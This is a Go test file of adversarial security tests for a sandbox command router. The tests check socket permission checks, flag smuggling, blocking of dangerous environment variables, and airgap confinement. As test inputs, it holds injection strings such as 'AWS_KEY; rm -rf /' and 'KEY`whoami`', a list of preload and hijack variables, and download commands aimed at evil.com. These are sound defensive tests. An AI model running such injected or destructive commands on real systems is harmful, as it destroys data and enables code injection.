package router

import (
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/bonjoski/fabrial/pkg/policy"
)

// TestAdversarial_SocketSecurityAttestation verifies Invariant #2:
// Socket attestation must fail closed on insecure permissions, symlinks, and non-socket files.
func TestAdversarial_SocketSecurityAttestation(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("skipping unix domain socket permission attestation on windows")
	}

	origEnv := os.Getenv("AEGISBOX_SOCKET")
	defer func() {
		if origEnv != "" {
			_ = os.Setenv("AEGISBOX_SOCKET", origEnv)
		} else {
			_ = os.Unsetenv("AEGISBOX_SOCKET")
		}
	}()

	prefix := filepath.Join(os.TempDir(), "agb_adv_")

	// Vector 1: Insecure world-writable socket (0777)
	sock777 := prefix + "777.sock"
	_ = os.Remove(sock777)
	ln1, err := net.Listen("unix", sock777)
	if err != nil {
		t.Fatalf("failed to create 0777 socket: %v", err)
	}
	defer func() {
		_ = ln1.Close()
		_ = os.Remove(sock777)
	}()
	_ = os.Chmod(sock777, 0777)

	_ = os.Setenv("AEGISBOX_SOCKET", sock777)
	online, _ := CheckAegisboxDaemon()
	if online {
		t.Errorf("FAIL-OPEN: CheckAegisboxDaemon accepted world-writable socket (mode 0777)")
	}

	// Vector 2: Group-writable socket (0660)
	sock660 := prefix + "660.sock"
	_ = os.Remove(sock660)
	ln2, err := net.Listen("unix", sock660)
	if err != nil {
		t.Fatalf("failed to create 0660 socket: %v", err)
	}
	defer func() {
		_ = ln2.Close()
		_ = os.Remove(sock660)
	}()
	_ = os.Chmod(sock660, 0660)

	_ = os.Setenv("AEGISBOX_SOCKET", sock660)
	online, _ = CheckAegisboxDaemon()
	if online {
		t.Errorf("FAIL-OPEN: CheckAegisboxDaemon accepted group-accessible socket (mode 0660)")
	}

	// Vector 3: Symlinked socket
	sockReal := prefix + "real.sock"
	_ = os.Remove(sockReal)
	lnReal, err := net.Listen("unix", sockReal)
	if err != nil {
		t.Fatalf("failed to create real socket: %v", err)
	}
	defer func() {
		_ = lnReal.Close()
		_ = os.Remove(sockReal)
	}()
	_ = os.Chmod(sockReal, 0600)

	sockSymlink := prefix + "symlink.sock"
	_ = os.Remove(sockSymlink)
	if err := os.Symlink(sockReal, sockSymlink); err != nil {
		t.Fatalf("failed to create symlink: %v", err)
	}
	defer os.Remove(sockSymlink)

	_ = os.Setenv("AEGISBOX_SOCKET", sockSymlink)
	online, _ = CheckAegisboxDaemon()
	if online {
		t.Errorf("FAIL-OPEN: CheckAegisboxDaemon accepted a symlinked socket")
	}

	// Vector 4: Regular file masquerading as socket
	fakeFile := prefix + "fake_socket"
	_ = os.Remove(fakeFile)
	if err := os.WriteFile(fakeFile, []byte("not a socket"), 0600); err != nil {
		t.Fatalf("failed to write fake socket file: %v", err)
	}
	defer os.Remove(fakeFile)

	_ = os.Setenv("AEGISBOX_SOCKET", fakeFile)
	online, _ = CheckAegisboxDaemon()
	if online {
		t.Errorf("FAIL-OPEN: CheckAegisboxDaemon accepted a regular file as a socket")
	}

	// Vector 5: Properly secured socket (0600, real socket, matching UID)
	_ = os.Setenv("AEGISBOX_SOCKET", sockReal)
	online, _ = CheckAegisboxDaemon()
	if !online {
		t.Errorf("expected secure socket (mode 0600) to be accepted, but was rejected")
	}
}

// TestAdversarial_FlagContradictionsAndInjection tests adversarial flag smuggling.
func TestAdversarial_FlagContradictionsAndInjection(t *testing.T) {
	// Vector 1: Mutually exclusive --airgap and --net passed simultaneously
	args := []string{"--airgap", "--net", "--", "curl", "https://example.com"}
	_, _, err := ParseArgs(args)
	if err == nil {
		t.Fatalf("FAIL-OPEN: ParseArgs allowed contradictory flags --airgap and --net")
	}
	if !strings.Contains(err.Error(), "mutually exclusive") {
		t.Errorf("unexpected error: %v", err)
	}

	// Vector 2: Explicit Tier 2 escalation combined with --airgap
	opts := &ExecutionOptions{
		TierOverride: policy.Tier2,
		Airgap:       true,
	}
	_, err = Route(opts, []string{"npm", "install"})
	if err == nil {
		t.Fatalf("FAIL-OPEN: Route permitted Tier 2 execution with --airgap")
	}

	// Vector 3: Flag smuggling past '--' separator
	// User payload contains '--net', router must not treat it as a router flag
	args = []string{"--profile", "strict", "--", "git", "clone", "--net"}
	parsedOpts, cmdArgs, err := ParseArgs(args)
	if err != nil {
		t.Fatalf("ParseArgs error: %v", err)
	}
	if parsedOpts.Net {
		t.Errorf("FAIL-OPEN: payload flag '--net' leaked into router ExecutionOptions")
	}
	if len(cmdArgs) != 3 || cmdArgs[2] != "--net" {
		t.Errorf("expected '--net' to be preserved in cmdArgs, got: %v", cmdArgs)
	}
}

// TestAdversarial_SecretLeasingAttestation verifies that dangerous environment variables
// cannot be leased or hijacked via --lease-secret.
func TestAdversarial_SecretLeasingAttestation(t *testing.T) {
	dangerousKeys := []string{
		"LD_PRELOAD",
		"ld_preload",
		"LD_LIBRARY_PATH",
		"DYLD_INSERT_LIBRARIES",
		"DYLD_LIBRARY_PATH",
		"PATH",
		"SHELL",
		"IFS",
		"BASH_ENV",
		"NODE_OPTIONS",
		"PYTHONPATH",
	}

	for _, key := range dangerousKeys {
		t.Run("DangerousKey_"+key, func(t *testing.T) {
			args := []string{"--lease-secret", key, "--", "echo", "test"}
			_, _, err := ParseArgs(args)
			if err == nil {
				t.Fatalf("FAIL-OPEN: ParseArgs allowed dangerous lease secret %q", key)
			}
			if !strings.Contains(err.Error(), "reserved system environment variables") {
				t.Errorf("unexpected error message for %q: %v", key, err)
			}
		})
	}

	maliciousInjections := []string{
		"AWS_KEY; rm -rf /",
		"AWS_KEY\nEVIL=1",
		"KEY WITH SPACES",
		"FOO$BAR",
		"KEY`whoami`",
	}

	for _, injection := range maliciousInjections {
		t.Run("Injection_"+injection, func(t *testing.T) {
			args := []string{"--lease-secret", injection, "--", "echo", "test"}
			_, _, err := ParseArgs(args)
			if err == nil {
				t.Fatalf("FAIL-OPEN: ParseArgs allowed malicious secret name injection %q", injection)
			}
		})
	}

	// Valid secret identifiers must pass
	validArgs := []string{"--lease-secret", "AWS_ACCESS_KEY_ID,STRIPE_SECRET_KEY,OPENAI_API_KEY", "--", "echo", "ok"}
	opts, _, err := ParseArgs(validArgs)
	if err != nil {
		t.Fatalf("unexpected error on valid lease secrets: %v", err)
	}
	if opts.LeaseSecrets != "AWS_ACCESS_KEY_ID,STRIPE_SECRET_KEY,OPENAI_API_KEY" {
		t.Errorf("unexpected LeaseSecrets: %q", opts.LeaseSecrets)
	}
}

// TestAdversarial_CommandDisguiseAndEvasion verifies that sensitive tools disguised with
// paths, case variations, or relative directories cannot evade policy detection.
func TestAdversarial_CommandDisguiseAndEvasion(t *testing.T) {
	opts := &ExecutionOptions{Quiet: true}

	testCases := []struct {
		name    string
		cmd     []string
		expTier policy.Tier
	}{
		{"AbsoluteBash", []string{"/bin/bash", "-c", "whoami"}, policy.Tier2},
		{"RelativeBash", []string{"./bash", "-c", "whoami"}, policy.Tier2},
		{"CapsPython", []string{"PYTHON3", "script.py"}, policy.Tier2},
		{"AbsoluteNpm", []string{"/usr/local/bin/npm", "install"}, policy.Tier2},
		{"RelativeNpm", []string{"./npm", "install"}, policy.Tier2},
		{"CurlWithScheme", []string{"curl", "https://untrusted.internal"}, policy.Tier2},
		{"DockerRun", []string{"/usr/bin/docker", "run", "alpine"}, policy.Tier2},
		{"ScriptWithExtension", []string{"./deploy.sh"}, policy.Tier2},
		{"PythonScript", []string{"exploit.py"}, policy.Tier2},
		{"AbsoluteLinter", []string{"/usr/bin/eslint", "src/"}, policy.Tier1},
		{"CapsLinter", []string{"ESLINT", "src/"}, policy.Tier1},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			dec, err := Route(opts, tc.cmd)
			if err != nil {
				t.Fatalf("Route error: %v", err)
			}
			if dec.Tier != tc.expTier {
				t.Errorf("command %v routed to %v, expected %v (reason: %s)", tc.cmd, dec.Tier, tc.expTier, dec.Reason)
			}
		})
	}

	// Empty and whitespace commands must fail closed
	_, err := Route(opts, []string{""})
	if err == nil {
		t.Errorf("FAIL-OPEN: Route accepted empty command string")
	}

	_, err = Route(opts, []string{"   "})
	if err == nil {
		t.Errorf("FAIL-OPEN: Route accepted whitespace command string")
	}
}

// TestAdversarial_AirgapUniversalConfinement verifies that when --airgap is set,
// NO sensitive tool (even those normally mapped to Tier 2) can escape Tier 1 egress blocking.
func TestAdversarial_AirgapUniversalConfinement(t *testing.T) {
	opts := &ExecutionOptions{
		Airgap: true,
		Quiet:  true,
	}

	sensitiveTools := [][]string{
		{"npm", "install", "malicious-pkg"},
		{"pip", "install", "torch"},
		{"cargo", "build"},
		{"curl", "https://evil.com"},
		{"wget", "http://evil.com/payload"},
		{"bash", "script.sh"},
		{"python", "exfiltrate.py"},
		{"docker", "pull", "evil/image"},
	}

	for _, cmd := range sensitiveTools {
		t.Run("Airgap_"+cmd[0], func(t *testing.T) {
			dec, err := Route(opts, cmd)
			if err != nil {
				t.Fatalf("Route error on %v: %v", cmd, err)
			}
			if dec.Tier != policy.Tier1 {
				t.Errorf("FAIL-OPEN: command %v under --airgap was routed to %v instead of Tier 1", cmd, dec.Tier)
			}
			if dec.Engine != "airlock" {
				t.Errorf("FAIL-OPEN: engine is %q, expected airlock for offline airgap", dec.Engine)
			}
		})
	}
}

// TestAdversarial_PolicyTampering verifies that malformed or tampered fabrial.yaml policies
// fail closed and never fall back to unconfined execution.
func TestAdversarial_PolicyTampering(t *testing.T) {
	tmpDir := t.TempDir()

	// Corrupt YAML
	corruptPath := filepath.Join(tmpDir, "corrupt.yaml")
	if err := os.WriteFile(corruptPath, []byte("version: [unclosed bracket\nfoo:\n  bar: :::"), 0644); err != nil {
		t.Fatalf("failed to write corrupt YAML: %v", err)
	}

	opts := &ExecutionOptions{
		PolicyPath: corruptPath,
		Quiet:      true,
	}

	_, err := Route(opts, []string{"npm", "install"})
	if err == nil {
		t.Fatalf("FAIL-OPEN: Route succeeded with corrupt fabrial.yaml")
	}

	// Non-existent policy file passed to explicit path
	missingOpts := &ExecutionOptions{
		PolicyPath: filepath.Join(tmpDir, "non_existent_fabrial.yaml"),
		Quiet:      true,
	}
	_, err = Route(missingOpts, []string{"eslint", "."})
	if err == nil {
		t.Fatalf("FAIL-OPEN: Route succeeded with non-existent explicit policy path")
	}
}
